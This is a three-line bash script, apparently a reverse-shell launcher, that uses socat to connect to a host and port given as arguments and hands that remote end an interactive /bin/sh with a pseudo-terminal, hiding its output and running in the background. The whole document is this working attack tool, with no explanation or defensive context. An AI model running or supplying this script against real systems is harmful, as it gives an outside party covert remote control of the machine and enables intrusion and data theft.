#/bin/bash
#$host $port
env TERM=linux ./socat "$1:$2" exec:/bin/sh,pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &